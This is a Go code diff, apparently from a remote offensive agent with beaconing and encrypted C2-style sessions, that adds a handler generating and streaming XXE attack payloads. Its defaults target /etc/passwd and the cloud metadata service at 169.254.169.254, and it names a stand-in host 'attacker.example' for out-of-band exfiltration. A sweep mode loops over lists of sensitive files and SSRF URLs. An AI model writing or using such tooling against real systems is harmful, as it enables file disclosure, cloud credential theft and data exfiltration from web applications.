@@ -283,6 +283,13 @@ func runSession(host string, port int, agentID, caFP string, beaconSec int) erro
 				continue
 			}
 			go runWebSSTI(conn, sess, ws)
+		case proto.TypeWebXXEStart:
+			var wx proto.WebXXEStart
+			if err := json.Unmarshal(env.Payload, &wx); err != nil {
+				log.Printf("[webxxe] unmarshal: %v", err)
+				continue
+			}
+			go runWebXXE(conn, sess, wx)
 		case proto.TypeWirelessStop:
 			var ws proto.WirelessStop
 			if err := json.Unmarshal(env.Payload, &ws); err != nil {
@@ -1549,4 +1556,68 @@ func runWebSSTI(conn net.Conn, sess *crypto.Session, ws proto.WebSSTIStart) {
 		}
 	}
 	send("done", "", "", "", "")
+}
+
+// runWebXXE streams XXE payloads for the requested kind (or all kinds).
+func runWebXXE(conn net.Conn, sess *crypto.Session, wx proto.WebXXEStart) {
+	send := func(label, kind, payload, notes, extra string) {
+		sendTunnelAck(conn, sess, proto.TypeWebXXEData, proto.WebXXEData{
+			SessionID: wx.SessionID,
+			Label:     label,
+			Kind:      kind,
+			Payload:   payload,
+			Notes:     notes,
+			Extra:     extra,
+		})
+	}
+
+	opts := webgo.XXEOptions{
+		File:     wx.File,
+		URL:      wx.URL,
+		Attacker: wx.Attacker,
+	}
+	if opts.File == "" {
+		opts.File = "/etc/passwd"
+	}
+	if opts.URL == "" {
+		opts.URL = "http://169.254.169.254/latest/meta-data/"
+	}
+	if opts.Attacker == "" {
+		opts.Attacker = "attacker.example"
+	}
+
+	// sweep default file and URL targets
+	if wx.Defaults {
+		for _, f := range webgo.XXEDefaultFiles {
+			o := opts
+			o.File = f
+			for _, p := range webgo.XXEPayloads {
+				if p.Kind != "in-band" {
+					continue
+				}
+				send(p.Label, p.Kind, webgo.RenderXXE(p, o), p.Notes, "file="+f)
+			}
+		}
+		for _, u := range webgo.XXEDefaultSSRFURLs {
+			o := opts
+			o.URL = u
+			for _, p := range webgo.XXEPayloads {
+				if p.Kind != "ssrf" {
+					continue
+				}
+				send(p.Label, p.Kind, webgo.RenderXXE(p, o), p.Notes, "url="+u)
+			}
+		}
+		send("done", "done", "", "", "")
+		return
+	}
+
+	// single-category
+	for _, p := range webgo.XXEPayloads {
+		if wx.Kind != "" && wx.Kind != "all" && p.Kind != wx.Kind {
+			continue
+		}
+		send(p.Label, p.Kind, webgo.RenderXXE(p, opts), p.Notes, "")
+	}
+	send("done", "done", "", "", "")
 }
